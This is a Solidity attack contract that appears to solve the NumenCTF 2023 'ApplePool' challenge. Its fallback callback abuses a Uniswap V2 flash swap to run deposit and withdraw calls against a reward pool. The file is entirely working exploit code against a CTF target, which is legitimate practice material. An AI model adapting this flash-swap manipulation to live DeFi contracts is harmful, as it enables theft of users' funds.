// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "src/NumenCTF_2023/ApplePool/check.sol";

contract ApplePoolAttack {
    ApplePoolCheck public applePoolCheck;
    AppleRewardPool public appleRewardPool;
    UniswapV2Pair public pair1;
    UniswapV2Pair public pair2;
    IERC20 public token1;
    IERC20 public token2;
    IERC20 public token3;

    constructor(address target) {
        applePoolCheck = ApplePoolCheck(target);
        appleRewardPool = applePoolCheck.appleRewardPool();
        pair1 = UniswapV2Pair(applePoolCheck.pair1());
        pair2 = UniswapV2Pair(applePoolCheck.pair2());
        token1 = IERC20(pair1.token1());
        token2 = IERC20(pair2.token1());
        token3 = appleRewardPool.token3();
    }

    function attack()  public {
        token1.approve(address(appleRewardPool), 100000 ether);
        token2.approve(address(appleRewardPool), 100000 ether);
        pair1.swap(0, 9999 ether, address(this), new bytes(2));
        token2.transfer(address(pair2), 5000 ether);
        pair2.swap(3333 ether, 0, address(this), new bytes(0));

        appleRewardPool.deposit(1, 5000 ether);
        appleRewardPool.withdraw(1, 5000 ether);
        appleRewardPool.deposit(1, 5000 ether);
    }

    fallback() external payable {
        appleRewardPool.deposit(0, 1 ether);
        appleRewardPool.withdraw(0, 1 ether);
        token1.transfer(address(pair1), 9999 ether);
    }
}

